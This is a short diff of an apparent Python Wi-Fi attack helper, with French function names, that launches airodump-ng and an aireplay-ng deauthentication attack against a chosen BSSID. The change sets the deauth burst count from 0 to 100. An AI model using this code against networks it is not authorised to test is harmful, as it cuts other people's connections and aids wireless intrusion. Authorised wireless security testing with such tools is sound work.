@@ -15,7 +15,7 @@ def lancer_airodump_ng(channel, bssid):
     subprocess.call(command_airodump)
 
 def lancer_aireplay_ng(bssid):
-    command_aireplay = ['x-terminal-emulator', '-e', 'aireplay-ng', '-deauth', '0', '-a', bssid, 'wlan0']
+    command_aireplay = ['x-terminal-emulator', '-e', 'aireplay-ng', '-deauth', '100', '-a', bssid, 'wlan0']
     subprocess.call(command_aireplay)
 
 # Chemin du fichier selection.json
